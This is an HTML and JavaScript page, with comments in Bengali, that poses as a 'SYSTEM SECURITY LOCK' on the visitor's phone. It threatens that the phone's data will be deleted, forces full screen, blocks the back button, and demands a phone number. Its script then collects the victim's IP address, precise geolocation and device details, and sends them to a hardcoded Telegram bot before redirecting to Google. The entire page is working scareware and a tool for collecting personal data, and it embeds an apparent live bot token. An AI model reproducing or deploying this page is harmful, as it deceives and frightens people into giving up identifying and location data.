<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚠️ SYSTEM SECURITY LOCK</title>
    <style>
        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .lock-screen { border: 2px solid #f00; padding: 30px; background: #0a0a0a; box-shadow: 0 0 50px #f00; width: 85%; z-index: 9999; }
        h1 { font-size: 24px; animation: blink 0.5s infinite; }
        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0; } 100% { opacity: 1; } }
        input { width: 90%; padding: 15px; margin: 20px 0; border: 1px solid #f00; background: #000; color: #0f0; font-size: 18px; text-align: center; outline: none; }
        .btn { background: #f00; color: #fff; padding: 15px; width: 100%; border: none; font-weight: bold; cursor: pointer; font-size: 16px; }
    </style>
</head>
<body onclick="enableFullScreen()">

    <div class="lock-screen" id="mainBox">
        <h1>[ SYSTEM LOCKED ]</h1>
        <p>Your phone is locked due to suspicious activity. Unauthorized exit will trigger data deletion.</p>
        <p style="color: yellow;">Enter your phone number to authorize unlock:</p>
        
        <input type="number" id="phoneNum" placeholder="Phone Number" required>
        
        <button class="btn" onclick="captureAndUnlock()">AUTHORIZE & UNLOCK</button>
    </div>

<script>
    // ফুল স্ক্রিন মোড সচল করা (এতে নেভিগেশন বার লুকিয়ে যায়)
    function enableFullScreen() {
        let elem = document.documentElement;
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        }
    }

    // ব্যাক বাটন ব্লক করা
    window.history.pushState(null, null, window.location.href);
    window.onpopstate = function () {
        window.history.go(1);
        alert("⚠️ WARNING: Attempt to bypass security! Exit blocked.");
    };

    // ক্লোজ করার চেষ্টা করলে ওয়ার্নিং
    window.onbeforeunload = function() {
        return "Are you sure you want to leave? Your data may be lost.";
    };

    async function captureAndUnlock() {
        const phone = document.getElementById('phoneNum').value;
        if (phone.length < 10) {
            alert("সঠিক নম্বর দিন!");
            return;
        }

        // আইপি ও লোকেশন ডেটা পাঠানো
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();

        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition((pos) => {
                sendToBot(phone, ipData, pos.coords.latitude, pos.coords.longitude);
            }, () => {
                sendToBot(phone, ipData, "Denied", "Denied");
            });
        }
    }

    function sendToBot(phone, ipData, lat, lon) {
        const token = "8242516940:AAEGD8u48I_miakigo6zRSfJ6pvyEq7wM6k";
        const chat_id = "7547190025";
        const device = navigator.userAgent;
        
        let map = (lat === "Denied") ? "Denied" : `https://www.google.com/maps?q=${lat},${lon}`;
        
        const text = `🎯 **ফোন লক করা হয়েছে!** 🎯\n\n` +
                     `📞 **Phone:** ${phone}\n` +
                     `🌐 **IP:** ${ipData.ip}\n` +
                     `📱 **Device:** ${device}\n` +
                     `📍 **Map:** ${map}`;

        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`)
        .then(() => {
            alert("Authorization Successful! System Unlocked.");
            window.location.href = "https://www.google.com";
        });
    }
</script>

</body>
</html>
